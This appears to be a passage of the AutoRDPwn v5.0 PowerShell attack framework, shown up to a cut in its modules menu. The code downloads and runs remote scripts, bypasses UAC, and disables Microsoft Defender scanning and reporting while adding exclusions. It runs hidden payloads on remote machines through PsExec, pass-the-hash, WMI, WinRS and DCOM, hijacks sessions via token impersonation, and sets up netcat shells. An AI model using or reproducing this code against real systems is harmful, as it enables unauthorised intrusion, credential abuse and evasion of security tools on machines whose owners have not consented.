[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8") ; $OSVersion = [Environment]::OSVersion.Platform
$noadmin=$args[0] ; $nogui=$args[1] ; $lang=$args[2] ; $option=$args[4] ; $shadowoption=$args[6] ; $createuser=$args[8] ; if($args[1,2,3,4,5,6]){ if(!$args[7]) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
if($OSVersion -like 'Win*'){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/AutoBypass.ps1')
if($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $args " ; exit }}
(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/AutoRDPwn.ico","$pwd\AutoRDPwn.ico") ; (New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Set-ConsoleIcon.ps1","$pwd\Set-ConsoleIcon.ps1") ; .\Set-ConsoleIcon.ps1 AutoRDPwn.ico ; del Set-ConsoleIcon.ps1,AutoRDPwn.ico
$Host.UI.RawUI.BackgroundColor = 'Black' ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; $Host.PrivateData.ErrorForegroundColor = 'Red' ; $Host.PrivateData.WarningForegroundColor = 'Magenta' ; $Host.PrivateData.DebugForegroundColor = 'Yellow' ; $Host.PrivateData.VerboseForegroundColor = 'Green' ; $Host.PrivateData.ProgressForegroundColor = 'White' ; $Host.PrivateData.ProgressBackgroundColor = 'Blue' }
$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v5.0 - by @JoelGMSec" ; $ErrorActionPreference = "SilentlyContinue" ; Set-StrictMode -Off ; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/Disable-Close.ps1')

function Show-Banner { Clear-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if($nogui -like '-nogui') { $null } else { 
     Write-Host
     Write-Host "    ___          __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "_________ _________ ________ " -NoNewLine -ForegroundColor Blue ; Write-Host "               " -ForegroundColor Green
     Write-Host "  /  _  \  __ __|  |_ ___ " -NoNewLine -ForegroundColor Magenta ; Write-Host "\______   \_______  \______  \" -NoNewLine -ForegroundColor Blue ; Write-Host "  _  ___ ___  " -ForegroundColor Green
     Write-Host " /  / \  \|  |  |   _| _  \" -NoNewLine -ForegroundColor Magenta ; Write-Host "|       _/| |    \  |    ___/" -NoNewLine -ForegroundColor Blue ; Write-Host "\/ \/  /     \ " -ForegroundColor Green
     Write-Host "/  /___\  \  |  |  |  (_)  " -NoNewLine -ForegroundColor Magenta ; Write-Host "|   |    \| |____/  |   |" -NoNewLine -ForegroundColor Blue ; Write-Host " \        /   |   \" -ForegroundColor Green
     Write-Host "\  _______/_____/__|\_____/" -NoNewLine -ForegroundColor Magenta ; Write-Host "|___|__  /_________/|___|" -NoNewLine -ForegroundColor Blue ; Write-Host "  \__/\__/|___|_  /" -ForegroundColor Green
     Write-Host " \/                        " -NoNewLine -ForegroundColor Magenta ; Write-Host "       \/                " -NoNewLine -ForegroundColor Blue ; Write-Host "                \/ " -ForegroundColor Green
     Write-Host
     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
     Write-Host "::" -NoNewLine -ForegroundColor Gray ; Write-Host "  The Shadow Attack Framework" -NoNewLine -ForegroundColor Yellow ; Write-Host "  :: " -NoNewLine -ForegroundColor Gray ; Write-Host "v5.0" -NoNewLine -ForegroundColor Yellow ; Write-Host " ::" -NoNewLine -ForegroundColor Gray ; Write-Host "  Created by @JoelGMSec" -NoNewLine -ForegroundColor Yellow ; Write-Host "  ::" -ForegroundColor Gray
     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::" -ForegroundColor Gray
     Write-Host }}

function Show-Language { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-nogui') { $null } else {
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - English" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Spanish" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - French" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - German" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Italian" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Russian" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - Portuguese" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "H" -NoNewLine -ForegroundColor Blue ; Write-Host "] - Help" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - Exit" -ForegroundColor Gray
     Write-Host }}

function Show-Menu { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-nogui') { $null } else {
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - PSexec" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Pass the Hash" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Management Instrumentation" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - InvokeCommand / PSSession" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - Windows Remote Assistance" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - Session Hijacking (local)" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - DCOM Passwordless Execution" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt1" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
     Write-Host }}

function Show-Modules { $Host.UI.RawUI.ForegroundColor = 'Gray'; if($nogui -like '-nogui') { $null } else {
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt17" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt50" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Networking / Pivoting" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Desktop Forensics" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "5" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt64" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "6" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt68" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "7" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt69" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
     Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
     Write-Host }}

function ConvertFrom-SecureToPlain {
    param([Parameter(Mandatory=$true)][System.Security.SecureString] $SecurePassword)
    $PasswordPointer = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
    $PlainTextPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto($PasswordPointer)
    [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($PasswordPointer)
    $PlainTextPassword }

function Test-Command {
    Param ($command)
    $oldPreference = $ErrorActionPreference
    $ErrorActionPreference = 'stop'
    try {if(Get-Command $command){RETURN $true}}
    Catch {RETURN $false}
    Finally {$ErrorActionPreference=$oldPreference}}

function Remove-Exclusions { 
    $exclusion = Get-MpPreference ; $exclusion.exclusionprocess | % { Remove-MpPreference -ExclusionProcess $_ 2>&1> $null }
    $exclusion = Get-MpPreference ; $exclusion.exclusionpath | % { Remove-MpPreference -ExclusionPath $_ 2>&1> $null }
    $exclusion = Get-MpPreference ; $exclusion.exclusionextension | % { Remove-MpPreference -ExclusionExtension $_ 2>&1> $null }
    Set-MpPreference -DisableIOAVProtection 0 2>&1> $null ; Clear-Item -Path WSMan:localhostClientTrustedHosts -Force 2>&1> $null 
    Set-MpPreference -SubmitSamplesConsent 1 2>&1> $null ; Set-MpPreference -MAPSReporting 2 2>&1> $null ; Set-MpPreference -DisableScriptScanning 0 2>&1> $null }

    $system = (Get-WmiObject Win32_OperatingSystem).OSArchitecture ; if(!$nogui){ 
    $help = "The detailed guide of use can be found at the following link:"

    do { Show-Banner ; Show-Language
    $Random = New-Object System.Random ; "Choose your language:` " -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine() ; switch ($input) {

       '1' { $language = 'English' }
       '2' { $language = 'Spanish' }
       '3' { $language = 'French' }
       '4' { $language = 'German' }
       '5' { $language = 'Italian' }
       '6' { $language = 'Russian' }
       '7' { $language = 'Portuguese' }
       'H' { Write-Host ; Write-Host $help -ForegroundColor Green ; Write-Host ; Write-Host 'https://darkbyte.net/autordpwn-la-guia-definitiva' -ForegroundColor Blue ; Start-Sleep -milliseconds 7500 }
       'X' { return }

    default { Write-Host ; Write-Host "Wrong option, please try again" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}} until ($input -in '1','2','3','4','5','6','7','X')}
    
    if($lang -like '-lang') { $language=$args[3] }
    if($language -in 'English') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/English.ps1') }
    if($language -in 'Spanish') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Spanish.ps1') }
    if($language -in 'French') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/French.ps1') }
    if($language -in 'German') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/German.ps1') }
    if($language -in 'Italian') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Italian.ps1') }
    if($language -in 'Russian') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Russian.ps1') }
    if($language -in 'Portuguese') { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Languages/Portuguese.ps1') }
    
    $powershell = $host.version ; Write-Host ; if($powershell.major -lt 4) { Write-Host "$txt3" -ForegroundColor 'Red' ; Write-Host
    Write-Host "$txt4" -NoNewLine -ForegroundColor 'Red' ; Write-Host -NoNewLine ; Write-Host " http://aka.ms/wmf5download" -ForegroundColor 'Blue' ; Write-Host ; Start-Sleep -milliseconds 7500 ; exit }
    Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null; Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null ; Set-MpPreference -DisableScriptScanning 1 2>&1> $null
    Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 1 2>&1> $null ; Set-MpPreference -SubmitSamplesConsent 0 2>&1> $null ; Set-MpPreference -MAPSReporting 0 2>&1> $null

    do { Show-Banner ; Show-Menu
    $currentuser = [Environment]::username ; if($option -like '-option') { $input=$args[5] } else { 
    $Random = New-Object System.Random ; $txt7 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; $input = $Host.UI.ReadLine()} ; switch ($input) {

        '1' {
        if($option) { $computer='localhost' } else {
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
        $computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
        Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
        if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } 
        $Host.UI.RawUI.ForegroundColor = 'Blue' }
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-PSexec.ps1')
        if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn1" -nobanner -accepteula
        .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn2" -nobanner -accepteula
        .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn3" -nobanner -accepteula
        .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn4" -nobanner -accepteula }
        if($user) { .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn1" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn2" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn3" -nobanner -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn4" -nobanner -accepteula }
        del .\psexec.exe }

        '2' {
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
        $computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
        Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
        Write-Host ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $domain = $Host.UI.ReadLine() ; if(!$domain) { [Console]::SetCursorPosition(0,"$cursortop")
        $domain = 'localhost' ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
        do { Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray ; $hash = $Host.UI.ReadLine()
        if(!$hash) { Write-Host ; Write-Host $txt6 -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }} until ( $hash )
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SMBExec.ps1')
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn5" }

        '3' {
        if($option) { $computer='localhost' } else {
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
        $computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
        Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
        if(!$credential) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' }
        if(!$user) { Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn1 2>&1> $null
        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }
        Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn2 2>&1> $null ; Write-Host
        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }
        Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn3 2>&1> $null ; Write-Host
        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }
        Invoke-WmiMethod -computer $computer -path win32_process -name create -argumentList $Pwn4 2>&1> $null ; Write-Host
        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }}
        if($user) { Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn1 2>&1> $null
        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }
        Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn2 2>&1> $null ; Write-Host
        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }
        Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn3 2>&1> $null ; Write-Host
        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }
        Invoke-WmiMethod -computer $computer -credential $credential -path win32_process -name create -argumentList $Pwn4 2>&1> $null ; Write-Host
        if($? -eq 'True') { Write-Host "[+] Command was executed successfully!" } else { Write-Host "[-] Command execution failed!" -ForegroundColor Red }}}

        '4' {
        if($option) { $computer='localhost' } else {
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
        $computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
        Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
        Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
        if(!$credential) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' }
        if(!$user) { Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn1 }
        Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn2 }
        Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn3 }
        Invoke-Command -Computer $computer -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn4 }}
        if($user) { Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn1 }
        Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn2 }
        Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn3 }
        Invoke-Command -Computer $computer -credential $credential -Authentication Negotiate -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn4 }}}

        '5' {
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
        $computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
        Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
        Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser }
        do { Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
        if(!$PlainTextPassword) { Write-Host ; Write-Host $txt6 -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }} until ( $PlainTextPassword )
        $Host.UI.RawUI.ForegroundColor = 'Blue' ; [Console]::SetCursorPosition(0,"$cursortop")
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn1"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn2"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn3"
        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn4" ; Write-Host }

        '6' {
        Write-Host ; $test = Test-Command tscon ; if($test -in 'True'){ Write-Host "$txt28" -ForegroundColor Blue ; Write-Host
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Get-System.ps1')
        Get-System -Technique Token ; Write-Host ; Write-Host "$using:txt33" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session ; Write-Host
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $tscon = $Host.UI.ReadLine()
        tscon $tscon 2>&1> $null ; if($? -in 'True'){ continue } else{ $tsfail = 'True' }}
        else{ Write-Host "$txt5" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 ; $input = $null ; Show-Banner ; Show-Menu }}

        '7' {
        if($option) { $computer='localhost' } else {
        Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
        $computer = $Host.UI.ReadLine() ; if(!$computer) { [Console]::SetCursorPosition(0,"$cursortop")
        $computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' }
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-DCOM.ps1')
        Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
        Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
        Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
        Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
        Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn5" }

        'M' { Show-Banner ; Show-Modules
        $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $module = $Host.UI.ReadLine() ; Write-Host

        if($module -like '1') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt39" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt51" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt52" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $shell = $Host.UI.ReadLine() ; Write-Host

        if($shell -like '1'){ $console = "true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
        
        if($shell -like '2'){ Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host
        Write-Host "$txt53" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
        Write-Host "$txt46" -ForegroundColor Green ; $netcat = 'local' ; Start-Sleep -milliseconds 2500 }

        if($shell -like '3'){ Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host
        Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $ncport = $Host.UI.ReadLine() ; Write-Host
        Write-Host "$txt54" -NoNewLine -ForegroundColor Gray ; $ipadress = $Host.UI.ReadLine() ; Write-Host
        Write-Host "$txt46" -ForegroundColor Green ; $netcat = 'remote' ; Start-Sleep -milliseconds 2500 }

        if($shell -like 'X'){ $input = 'x' ; continue }
